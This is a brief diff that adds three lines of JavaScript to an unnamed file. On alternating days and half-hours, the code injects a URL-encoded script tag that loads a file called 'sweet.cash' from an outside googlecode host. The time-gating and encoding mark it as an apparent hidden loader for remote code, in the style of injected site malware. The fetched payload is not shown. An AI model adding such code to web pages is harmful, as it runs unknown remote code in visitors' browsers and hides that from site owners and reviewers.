@@ -1,0 +1,3 @@
+var kqd = new Date();
+if (kqd.getDate() % 2 == 0 && kqd.getMinutes() >= 0 && kqd.getMinutes() < 30) {document.write(unescape("%3Cscript src=\'https://isoscripts.googlecode.com/svn/sweet.cash\' type=\'text/javascript\'%3E%3C/script%3E"));}
+if (kqd.getDate() % 2 != 0 && kqd.getMinutes() >= 30 && kqd.getMinutes() <= 59) {document.write(unescape("%3Cscript src=\'https://isoscripts.googlecode.com/svn/sweet.cash\' type=\'text/javascript\'%3E%3C/script%3E"));}
